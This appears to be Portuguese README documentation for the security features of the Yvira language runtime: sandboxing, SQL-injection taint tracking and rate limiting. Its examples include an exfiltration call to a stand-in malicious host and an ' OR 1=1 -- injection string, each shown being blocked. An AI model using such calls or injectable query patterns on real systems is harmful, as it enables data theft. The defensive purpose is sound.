# 🛡️ Blindagem de Segurança Corporativa do Yvira

O Yvira implementa uma suíte de segurança de nível industrial desenhada para proteger aplicações contra as vulnerabilidades mais críticas do ecossistema moderno (OWASP Top 10):

1. **Sandbox Baseado em Capacidades (Capability-Based Sandboxing)**
2. **Rastreamento de Dados Não Confiáveis (Taint Tracking Anti-SQL Injection)**
3. **Firewall Anti-DoS & Proteção de Taxa (Rate Limiting HTTP & WebSockets)**

---

## 1. Sandbox Baseado em Capacidades (`security.sandbox`)

Permite isolar a aplicação ou módulos de terceiros em um ambiente restrito onde qualquer acesso não expressamente autorizado ao sistema de arquivos (FS) ou rede externa (Net) é interceptado e bloqueado em tempo de execução com exceção de segurança (`SecurityException`).

### Configuração via Código:
```yvira
import "security"
import "fs"
import "http"

# Trava a aplicação em modo seguro
security.sandbox({
    fs: "readonly",                 # "readonly", "none" ou "full"
    net: ["api.meubanco.com.br"]     # Whitelist explícita de domínios permitidos
})

# Tentativa de escrita bloqueada:
try {
    fs.write("dados_sensíveis.txt", "conteudo")
} catch (erro) {
    print("Acesso bloqueado pelo sandbox:", erro)
}

# Tentativa de exfiltração de dados bloqueada:
try {
    http.get("https://servidor-malicioso.com/steal")
} catch (erro) {
    print("Acesso de rede negado pelo firewall:", erro)
}
```

### Configuração via Linha de Comando (CLI Flags):
Ao rodar qualquer script Yvira pelo terminal, você pode restringir as permissões diretamente na inicialização:
```bash
# Bloqueia qualquer acesso de rede
yvira run app.yv --deny-net

# Permite acesso apenas aos hosts autorizados
yvira run app.yv --allow-net=api.empresa.com,gateway.pagamentos.com

# Bloqueia qualquer escrita no disco
yvira run app.yv --deny-fs-write

# Bloqueia execução de subprocessos do SO
yvira run app.yv --deny-process
```

---

## 2. Taint Tracking Anti-SQL Injection

A principal causa de vazamento de dados em bancos relacionais é a interpolação ou concatenação direta de entradas de usuário dentro de comandos SQL. O Yvira possui um analisador dinâmico de contaminação de variáveis (**Taint Tracking**):

* Argumentos CLI (`args`), parâmetros de formulários HTTP, payloads WebSockets e variáveis marcadas com `security.taint()` são identificados pelo runtime como **não confiáveis** (`Tainted`).
* Qualquer concatenação de string (`+`) ou interpolação (`$"..."`) que envolva um dado *tainted* propaga a contaminação para a string resultante.
* Se uma query `@query(...)` ou `@exec(...)` receber uma string contaminada diretamente, **o Yvira interrompe a execução preventivamente antes que ela toque no banco de dados**, exigindo o uso de parâmetros preparados (`?`).

### Exemplo:
```yvira
import "security"

# Dado vindo de uma requisição externa
let usuarioInput = security.taint("' OR 1=1 --", "web_input")

# VULNERÁVEL (BLOQUEADO PELO YVIRA):
let queryInsegura = "SELECT * FROM usuarios WHERE email = '" + usuarioInput + "';"

try {
    let dados = @query(queryInsegura)
} catch (bloqueio) {
    print("O Yvira interceptou o ataque de SQL Injection:")
    print("  ->", bloqueio)
}

# SEGURO (APROVADO PELO YVIRA COM PARÂMETROS PREPARADOS):
let dadosSeguros = @query("SELECT * FROM usuarios WHERE email = ?", [security.sanitize(usuarioInput)])
```

---

## 3. Firewall Anti-DoS & Rate Limiting HTTP

Os servidores HTTP e WebSockets nativos do Yvira incluem filtros de proteção automática na camada de transporte:

* **Rate Limiter por IP:** Controle de taxa deslizante configurável (padrão 120 requisições/minuto por IP). Se exceder, responde com `HTTP 429 Too Many Requests` e JSON descritivo.
* **Payload Guards (Anti-Exaustão de Memória):** Limite estrito de tamanho de corpo de requisição (`maxPayloadBytes`, padrão 10 MB). Rejeita requisições gigantescas com `HTTP 413 Payload Too Large` antes de alocar memória em buffer.
* **Anti-Flood no `@realtime`:** Proteção configurada via `maxPacketsPerSec` por conexão WebSocket, fechando sockets que excedem o limite de spam.
